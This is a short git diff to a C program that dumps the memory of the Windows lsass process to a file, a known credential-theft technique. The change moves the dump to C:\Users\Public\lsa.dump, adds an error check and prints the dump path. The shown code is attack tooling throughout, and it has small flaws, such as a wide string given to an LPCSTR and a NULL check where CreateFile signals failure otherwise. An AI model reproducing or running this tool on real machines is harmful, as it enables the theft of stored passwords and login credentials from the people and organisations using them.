@@ -226,8 +226,12 @@ int main(int argc, char *argv[]) {
 		return 0;
 	}
 
-	LPCSTR fileName_pointer = L"C:\\Users\\sebastien.carre\\whitelist\\lsa.dump";
+	LPCSTR fileName_pointer = L"C:\\Users\\Public\\lsa.dump";
 	HANDLE output = CreateFile(fileName_pointer, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (output == NULL) {
+		printf("Can't open output file %ls\n", fileName_pointer);
+		exit(-1);
+	}
 	DWORD accessAllow = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
 
 	HANDLE processHandler = OpenProcess(accessAllow, 0, processPID);
@@ -254,7 +258,7 @@ int main(int argc, char *argv[]) {
 			printf("%d\n", bytesRead);
 			DWORD bytesWritten = 0;
 			WriteFile(output, dumpBuffer, bytesRead,&bytesWritten,NULL);
-			printf("[+] lsass is dumped : %d bytes\n", bytesWritten);
+			printf("[+] lsass is dumped : %d bytes on %ls \n", bytesWritten, fileName_pointer);
 		}
 		else {
 			printf("[-] lsass is not dumped\n");
